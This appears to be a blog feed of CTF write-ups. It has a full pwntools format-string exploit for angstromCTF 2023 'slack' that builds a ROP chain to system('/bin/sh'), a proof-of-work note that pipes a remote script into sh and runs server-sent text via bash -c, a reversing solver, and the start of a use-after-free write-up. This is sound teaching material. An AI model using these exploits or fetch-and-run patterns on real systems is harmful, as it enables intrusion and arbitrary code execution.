class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span> <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to slack (not to be confused with the popular chat service Slack)!&quot;</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    v4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- slack Bot:  %s\n&quot;</span>, s, (&amp;messages)[v4 % <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your message (to increase character limit, pay $99 to upgrade to Professional): &quot;</span>);</span><br><span class="line">    fgets(format, <span class="number">14</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- You: &quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v13 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I just found the 3rd <code>fsb</code> only in this CTF. haha.</p><p>Anyway, only the buffer is 14 bytes. Actually 1 byte is for NULL. (Because <code>fgets()</code> receives string.)</p><p>Be careful when inputting with the <code>fgets()</code> becuase it receives an enter(‘\n’). It means if you send 13 bytes, you’ll have to send without ‘\n’. And if you send under 13 bytes, you’ll have to send including ‘\n’.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>We can’t do overwriting because of <code>FULL RELRO</code>. </p><img src="/images/230427-angstromctf2023-5.slack/Screenshot 2023-04-27 at 18.03.16.png" width=500/><br><p>I need to get red’s offest(25) and yellow’s offset(55).</p><p>First, I access the red’s offset, and then write a <code>ptr_idx + 3</code> address. Because <code>ptr_idx</code> is small, so I have limit to trigger <code>fsb</code> vulnerability. So, I have to unlock this limit. I access yellow’s offset, and write a 0x80. Because I want to make <code>ptr_idx</code> as a negative.</p><p>So, I can trigger <code>fsb</code> vulnerability infinitely!! This rule also applies when <code>rop_payload</code> write to the stack.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./slackp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31500</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./slackp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p_%9$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x2206a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 25번째에 저장된 주소 0x00007fffe4063d28 </span></span><br><span class="line">ptr_idx = stack_leak + <span class="number">0x2128</span> </span><br><span class="line">info(<span class="string">&#x27;ptr_idx :: &#x27;</span> + <span class="built_in">hex</span>(ptr_idx))</span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;(ptr_idx+<span class="number">3</span>) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hn은 2바</span></span><br><span class="line">info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%128c%55$hhn&#x27;</span>) <span class="comment"># hhn은 1바</span></span><br><span class="line"><span class="comment"># gef&gt; x/wx $rbp-0x68</span></span><br><span class="line"><span class="comment"># 0x7fff51b42e88: 0x80000003  </span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(pop_rdi)</span><br><span class="line">rop_payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">stack_ret = stack_leak + <span class="number">0x2198</span></span><br><span class="line"><span class="comment"># rop_payload를 stack_ret부터 1바이트씩 써야 한다.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_payload)):</span><br><span class="line">    <span class="comment"># 1. 25에 접근해서 55번째에 stack_ret 2바이트씩 쓰기</span></span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;(stack_ret+i) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 55에 접근해서(stack_ret에 접근해서) rop_payload 1바이트씩 쓰기</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> rop_payload[i] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#info(hex(rop_payload[i]))</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        payload = <span class="string">f&#x27;%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># send로 보내면 안됨</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        payload = <span class="string">f&#x27;%<span class="subst">&#123;rop_payload[i]&#125;</span>c%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># send로 보내면 안됨</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># stack_ret에 rop_payload 적어주고 프로그램을 종료되게 만들어야 함</span></span><br><span class="line"><span class="comment"># ptr_idx에 2 넣어주자.</span></span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;ptr_idx &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hn은 2바</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%2c%55$n&#x27;</span>) <span class="comment"># n은 4바</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>If you want to make function that writes <code>rop_payload</code> to the stack, you can do it like this. :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte</span>(<span class="params">addr, value</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;addr &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;write <span class="subst">&#123;<span class="built_in">hex</span>(value)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) == <span class="number">13</span>:</span><br><span class="line">        p.send(payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%55$hhn&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%<span class="subst">&#123;value&#125;</span>c%55$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;succesfu1_onb0arding_f99454d9a2f42632&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - proof of work (remote)</title>
      <link href="/230426-pwn-proof-of-work/"/>
      <url>/230426-pwn-proof-of-work/</url>
      
        <content type="html"><![CDATA[<p>주로 포너블 문제에서 리모트에 연결했을 때 브포 방지를 위해 <code>proof of work</code>를 요구하는 경우가 있다.</p><h2 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proof of work: curl -sSfL https://pwn.red/pow | sh -s s.AAAdTA==.Ae+rYf3l1Pg/Ib8DPnqHKw==</span><br><span class="line">solution: </span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jersey CTF III 2023 - tracer</title>
      <link href="/230418-jerseyctf2023-tracer/"/>
      <url>/230418-jerseyctf2023-tracer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1908">https://ctftime.org/event/1908</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><ul><li></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for ( i = 0; i &lt;= 304; ++i )</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># for ( j = 0; j &lt;= 0x26; ++j )</span></span><br><span class="line">    <span class="comment"># flag[j] = key[j] ^ sbox[(unsigned __int8)flag[j]];</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">FC 55 A8 C7 F5 52 07 B4  25 B0 65 CC 9C 5F C8 90</span></span><br><span class="line"><span class="string">4B 1B 01 05 80 A3 06 D4  47 94 50 32 F9 04 52 58</span></span><br><span class="line"><span class="string">88 31 A5 BD 82 D9 8E 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">flag = [i <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">9A 81 14 C3 E0 CA C0 09  B8 C8 27 7A 5F D7 B1 ED</span></span><br><span class="line"><span class="string">9A 73 1A 8F 8C 04 92 8E  EA 7C 5A BD B1 B4 72 1B</span></span><br><span class="line"><span class="string">2F 3A 76 C6 C9 02 EA 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sbox = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">66 40 3A 55 92 34 EF AA  33 AF 4F B7 0C C9 B8 A4</span></span><br><span class="line"><span class="string">E4 EE FE EC 08 BD DA F1  91 DF 01 AE 75 5A 43 05</span></span><br><span class="line"><span class="string">F2 64 8B BC 61 A3 B6 C8  57 ED 94 98 03 8E AB 7D</span></span><br><span class="line"><span class="string">51 F7 65 CA 76 C5 50 D2  BE CD 1F 1C 26 97 D7 89</span></span><br><span class="line"><span class="string">19 C6 21 99 31 95 67 60  A8 10 7A 5C 53 0B 7C 30</span></span><br><span class="line"><span class="string">32 B2 12 29 CE E2 2E 7B  37 15 56 A1 2D 47 D1 88</span></span><br><span class="line"><span class="string">A5 2A 9B 5D F5 71 85 90  62 E6 D9 D8 11 0D 63 D3</span></span><br><span class="line"><span class="string">07 1A E3 70 24 F4 DC 4B  93 81 6E 8D F9 FD E0 A0</span></span><br><span class="line"><span class="string">73 DB 59 4E 17 87 96 42  BB CF BA 2B EA 44 6A 1D</span></span><br><span class="line"><span class="string">9D 4D 79 B9 BF 5F E9 F0  41 3C 28 6C AC FA 02 1B</span></span><br><span class="line"><span class="string">E1 B0 54 FB 84 D0 22 6F  13 F6 8C DD 52 68 D5 D4</span></span><br><span class="line"><span class="string">58 83 C2 EB E7 6D 18 E5  CC 00 9E FF CB 5B 78 C7</span></span><br><span class="line"><span class="string">2C C1 B1 FC 3F AD 9A A7  B4 5E F3 8F DE C3 14 E8</span></span><br><span class="line"><span class="string">2F 0F 8A 3D 36 49 48 C0  D6 23 04 7F 7E 3B 16 69</span></span><br><span class="line"><span class="string">25 0A A9 09 6B 77 F8 B5  45 A6 1E 06 20 0E 39 38</span></span><br><span class="line"><span class="string">4A 74 B3 4C 27 3E C4 72  86 80 A2 9C 9F 46 82 35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">305</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>):</span><br><span class="line">        flag[j] = key[j] ^ sbox[flag[j]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jersey </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackPack CTF 2023 - Number Store (UAF)</title>
      <link href="/230417-hackpackctf2023-number_store/"/>
      <url>/230417-hackpackctf2023-number_store/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1893">https://ctftime.org/event/1893</a></li></ul><blockquote><p>Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite secret numbers or generate new random ones! Also comes with a super secret flag!<br><code>nc cha.hackpack.club 41705</code></p></blockquote><ul><li>[48 solves &#x2F; 116 points]</li></ul><p>아마 이 블로그 최초 uaf 롸업이지 않나 싶다. 힙 문제를 기피했었는데 태그가 easy여서 풀어봤다..<br>ctf 시작하고 바이너리를 다운받고 끝나고 풀어봤는데 중간에 바이너리가 바뀌었다. <code>printFlag</code> 함수 주소만 바꿔주니 remote로 플래그를 얻을 수 있어서 그냥 예전 바이너리 코드를 보겠다 ㅎ.. (실제로 분석은 예전 바이너리로 했기 때문..)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>일단 <code>main</code> 함수를 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> func_result; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> print_idx; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> edit_idx; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> IndexNum; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> UserNum; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  _QWORD *_func_result; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **Number_obj; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *Number_obj_copy; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  Number_obj = (<span class="type">const</span> <span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">8uLL</span>);<span class="comment">// 8짜리 10개</span></span><br><span class="line">  Number_obj_copy = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">16uLL</span>);<span class="comment">// 16짜리 10개</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">159</span>; i += <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;Number_obj_copy[i], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  _func_result = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  printStr(<span class="string">&quot;WELCOME TO NUMBER STORE\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Store your favorite or secret numbers here! You can even generate new random numbers!\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Now includes a super secret flag!\n\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    printStr(<span class="string">&quot;1.) Store New Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;2.) Delete Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;3.) Edit Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;4.) Show Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;5.) Show Number List\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;6.) Generate Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;7.) Show Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;8.) Show Super Secret Flag\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;9.) 